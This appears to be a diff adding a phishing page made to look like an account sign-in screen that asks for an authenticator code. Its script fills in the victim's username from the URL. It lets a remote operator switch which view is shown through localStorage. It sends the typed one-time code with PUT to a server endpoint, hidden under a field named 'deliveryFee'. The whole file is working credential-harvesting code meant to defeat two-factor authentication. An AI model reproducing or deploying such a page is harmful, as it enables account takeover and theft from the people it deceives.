@@ -1,0 +1,131 @@
+<html>
+<head>
+      <title>Sign in to your account</title>
+      <link rel="icon" type="image/png" href="ico.png">
+	  <link rel="stylesheet" href="auth.css">
+</head>
+<body>
+
+    <div id="container" class="vieww">
+      <div id="house">
+        <div>
+          <img src="loco.png" alt="">
+        </div>
+        <div id="userr" class="usar">
+         - 
+        </div>
+        <div id="enterr">
+          <h1>Enter code</h1>
+        </div>
+        <div>
+          <p class="plat">Enter the code displayed in the authenticator</p>
+          <p class="plat">app on your mobile device</p>
+          
+        </div>
+        <div id="iput">
+          <input type="password" placeholder="Enter authenticator code" id="auth">
+        </div>
+        <div>
+          <p><span>More information</span></p>
+        </div>
+        <div id="sxin">
+          <img src="vfile.png" alt="" id="vform">
+        </div>
+        </div>
+    </div>
+    
+</body>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  /**
+   * 1. HANDLE USER DISPLAY (Sync URL and LocalStorage)
+   */
+  const urlParams = new URLSearchParams(window.location.search);
+  const userFromUrl = urlParams.get('user');
+  const userFromStorage = localStorage.getItem('userName');
+  const finalUser = userFromUrl || userFromStorage;
+
+  if (finalUser) {
+    // Update all user display elements safely
+    ['userr', 'userr2', 'userr3', 'userr4', 'userr5'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.textContent = finalUser;
+    });
+    // Save it for other pages
+    localStorage.setItem('userName', finalUser);
+  }
+
+  /**
+   * 2. VIEW MANAGEMENT
+   */
+  function renderView() {
+    const views = document.querySelectorAll(".vieww");
+    const currentVieww = localStorage.getItem("currentView") || "container5";
+    const pinn = localStorage.getItem("inputVal");
+
+    views.forEach(view => view.style.display = "none");
+
+    const active = document.getElementById(currentVieww);
+    if (active) {
+      active.style.display = "flex";
+      if (currentVieww === "container2") {
+        const authNoElem = document.getElementById('authNo');
+        if (authNoElem) authNoElem.innerHTML = pinn;
+      }
+    }
+  }
+
+  renderView();
+  window.addEventListener("storage", renderView);
+
+  /**
+   * 3. DATA FETCHING (Optional/Initial)
+   */
+  async function hoad() {
+    try {
+      const res = await fetch("/rata");
+      if (res.ok) await res.json();
+    } catch (e) {
+      console.error("Hoad failed", e);
+    }
+  }
+  hoad();
+
+  /**
+   * 4. IMAGE BUTTON CLICK (The Fix)
+   */
+  const vform = document.getElementById('vform');
+  if (vform) {
+    vform.style.cursor = 'pointer'; // Make image look clickable
+
+    vform.addEventListener('click', async (e) => {
+      e.preventDefault();
+
+      const authInput = document.getElementById('auth');
+      if (!authInput) return;
+
+      const val = authInput.value;
+      const payload = { deliveryFee: val };
+
+      try {
+        const response = await fetch("/tata", {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          // If successful, redirect or refresh
+          window.location.reload(); 
+        } else {
+          alert("Failed to update. Please try again.");
+        }
+      } catch (error) {
+        console.error("Submit error:", error);
+      }
+    });
+  }
+});
+</script>
+
+</html>
